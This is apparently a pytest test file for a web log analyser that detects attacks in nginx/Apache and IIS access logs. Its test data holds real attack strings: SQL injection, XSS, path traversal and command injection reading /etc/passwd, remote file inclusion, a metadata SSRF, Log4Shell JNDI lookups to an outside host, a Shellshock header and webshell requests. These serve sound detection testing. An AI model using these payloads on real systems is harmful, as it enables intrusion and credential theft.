"""Logs de acesso web (nginx/Apache e IIS): assinaturas de ataque e falsos positivos."""

from __future__ import annotations

from pathlib import Path

import pytest
from fakes_logs import clf, fato_logs, w3c
from helpers import run_check

ID = "logs.analise"
IP = "93.184.216.34"


def _rodar(tmp_path: Path, linhas: list[str], nome: str = "access.log"):
    arq = tmp_path / nome
    arq.write_text("\n".join(linhas) + "\n", encoding="utf-8")
    return run_check(ID, fato_logs(arq))


def _normais(n: int = 20) -> list[str]:
    return [clf(i, "198.51.100.20", f"/pagina/{i}", tamanho=3000 + i) for i in range(n)]


@pytest.mark.parametrize(
    ("uri", "achado"),
    [
        ("/produto.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "logs.web.sqli"),
        ("/busca?q=1'%20OR%20'1'='1'--", "logs.web.sqli"),
        ("/busca?q=%3Cscript%3Ealert(1)%3C/script%3E", "logs.web.xss"),
        ("/download?f=../../../../etc/passwd", "logs.web.lfi"),
        ("/download?f=..%2f..%2f..%2f..%2fwindows/win.ini", "logs.web.traversal"),
        ("/index.php?page=http://198.51.100.99/shell.txt?", "logs.web.rfi"),
        ("/cgi-bin/ping.cgi?host=8.8.8.8;cat%20/etc/passwd", "logs.web.cmdi"),
        ("/fetch?url=http://169.254.169.254/latest/meta-data/", "logs.web.ssrf_metadados"),
        ("/?x=${jndi:ldap://198.51.100.99/a}", "logs.web.log4shell"),
    ],
)
def test_assinaturas_de_ataque_na_uri(tmp_path: Path, uri: str, achado: str) -> None:
    out = _rodar(tmp_path, [clf(i, IP, uri, 404) for i in range(3)] + _normais())
    assert achado in out.ids()


def test_log4shell_no_user_agent(tmp_path: Path) -> None:
    linhas = [clf(1, IP, "/", 200, agente="${jndi:ldap://198.51.100.99/x}")] + _normais()
    assert "logs.web.log4shell" in _rodar(tmp_path, linhas).ids()


def test_shellshock_no_user_agent(tmp_path: Path) -> None:
    linhas = [clf(1, IP, "/cgi-bin/test.cgi", 200, agente="() { :;}; /bin/cat /etc/passwd")]
    assert "logs.web.shellshock" in _rodar(tmp_path, linhas + _normais()).ids()


def test_resposta_2xx_deixa_o_ataque_possivelmente_bem_sucedido(tmp_path: Path) -> None:
    uri = "/produto.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
    ataques = [clf(i, IP, uri + f"--{i}", 200, tamanho=9000 + i) for i in range(3)]
    out = _rodar(tmp_path, ataques + _normais())
    achado = next(f for f in out.findings if f.check_id == "logs.web.sqli")
    assert "possivelmente" in achado.title


def test_ataque_barrado_com_403_nao_e_marcado_como_sucesso(tmp_path: Path) -> None:
    uri = "/produto.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
    out = _rodar(tmp_path, [clf(i, IP, uri, 403) for i in range(3)] + _normais())
    achado = next(f for f in out.findings if f.check_id == "logs.web.sqli")
    assert "possivelmente" not in achado.title


@pytest.mark.parametrize(
    "uri",
    [
        "/blog/como-usar-select-from-no-sql",
        "/docs/union-europeia?ano=2024",
        "/busca?q=alert+de+seguranca",
        "/arquivos/../publico/relatorio.pdf",
        "/baixar?arquivo=relatorio-final.pdf",
        "/api/v1/users?id=15&ordem=nome",
        "/redirecionar?url=https://exemplo.com.br/obrigado",
        "/etc/politica-de-privacidade",
        "/assets/jndi-guia.html",
    ],
)
def test_urls_parecidas_mas_legitimas_nao_geram_achado(tmp_path: Path, uri: str) -> None:
    out = _rodar(tmp_path, [clf(i, IP, uri, 200) for i in range(5)] + _normais())
    assert not out.findings


def test_site_limpo_gera_ponto_forte(tmp_path: Path) -> None:
    out = _rodar(tmp_path, _normais())
    assert not out.findings
    assert out.passed


def test_scanner_por_user_agent(tmp_path: Path) -> None:
    linhas = [
        clf(i, IP, f"/p{i}", 404, agente="sqlmap/1.7.2#stable (https://sqlmap.org)")
        for i in range(10)
    ]
    assert "logs.web.varredura_scanner" in _rodar(tmp_path, linhas + _normais()).ids()


def test_navegador_comum_nao_e_scanner(tmp_path: Path) -> None:
    agente = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
    )
    out = _rodar(tmp_path, [clf(i, IP, f"/p{i}", 200, agente=agente) for i in range(40)])
    assert "logs.web.varredura_scanner" not in out.ids()


def test_rajada_de_404_em_muitos_caminhos(tmp_path: Path) -> None:
    linhas = [clf(i, IP, f"/{nome}", 404, tamanho=150) for i, nome in enumerate(_nomes(60))]
    assert "logs.web.varredura_404" in _rodar(tmp_path, linhas + _normais()).ids()


def _nomes(n: int) -> list[str]:
    return [f"caminho-{i}.php" for i in range(n)]


def test_poucos_404_nao_sao_varredura(tmp_path: Path) -> None:
    linhas = [clf(i, IP, f"/antigo-{i}", 404) for i in range(5)]
    assert "logs.web.varredura_404" not in _rodar(tmp_path, linhas + _normais()).ids()


def test_forca_bruta_no_login(tmp_path: Path) -> None:
    linhas = [clf(i, IP, "/wp-login.php", 200, tamanho=5000) for i in range(40)]
    linhas = [linha.replace("GET", "POST") for linha in linhas]
    assert "logs.web.forca_bruta" in _rodar(tmp_path, linhas + _normais()).ids()


def test_poucos_acessos_ao_login_sao_normais(tmp_path: Path) -> None:
    linhas = [clf(i * 60, "198.51.100.30", "/login", 200) for i in range(4)]
    assert "logs.web.forca_bruta" not in _rodar(tmp_path, linhas + _normais()).ids()


def test_webshell_conhecida_respondendo_200(tmp_path: Path) -> None:
    linhas = [clf(i, IP, "/uploads/c99.php?cmd=id", 200, tamanho=777) for i in range(3)]
    ids = _rodar(tmp_path, linhas + _normais()).ids()
    assert "logs.web.webshell" in ids


def test_procura_por_webshell_que_nao_existe_e_apenas_sondagem(tmp_path: Path) -> None:
    linhas = [clf(i, IP, "/uploads/c99.php", 404) for i in range(3)]
    ids = _rodar(tmp_path, linhas + _normais()).ids()
    assert "logs.web.sondagem_shell" in ids
    assert "logs.web.webshell" not in ids


def test_arquivo_sensivel_respondido(tmp_path: Path) -> None:
    linhas = [clf(1, IP, "/.env", 200, tamanho=432), clf(2, IP, "/.git/config", 200, tamanho=300)]
    assert "logs.web.arquivo_sensivel" in _rodar(tmp_path, linhas + _normais()).ids()


def test_iis_w3c_com_campos(tmp_path: Path) -> None:
    corpo = w3c(
        [
            (i, IP, "/produto.aspx", "id=1%20UNION%20SELECT%20name%20FROM%20sys.tables", 500)
            for i in range(3)
        ]
        + [(i, "198.51.100.20", f"/pag{i}.aspx", "", 200) for i in range(10)]
    )
    arq = tmp_path / "u_ex261101.log"
    arq.write_text(corpo, encoding="utf-8")
    out = run_check(ID, fato_logs(arq))
    assert "logs.web.sqli" in out.ids()


def test_iis_limpo_gera_ponto_forte(tmp_path: Path) -> None:
    corpo = w3c([(i, "198.51.100.20", f"/pag{i}.aspx", "", 200) for i in range(10)])
    arq = tmp_path / "u_ex261101.log"
    arq.write_text(corpo, encoding="utf-8")
    out = run_check(ID, fato_logs(arq))
    assert not out.findings and out.passed


def test_amostras_vem_mascaradas_e_limitadas(tmp_path: Path) -> None:
    uri = "/x?token=AKIAIOSFODNN7EXAMPLE&q=1%20UNION%20SELECT%20a%20FROM%20b"
    out = _rodar(tmp_path, [clf(i, IP, uri, 404) for i in range(12)] + _normais())
    achado = next(f for f in out.findings if f.check_id == "logs.web.sqli")
    texto = str(achado.evidence)
    assert "AKIAIOSFODNN7EXAMPLE" not in texto
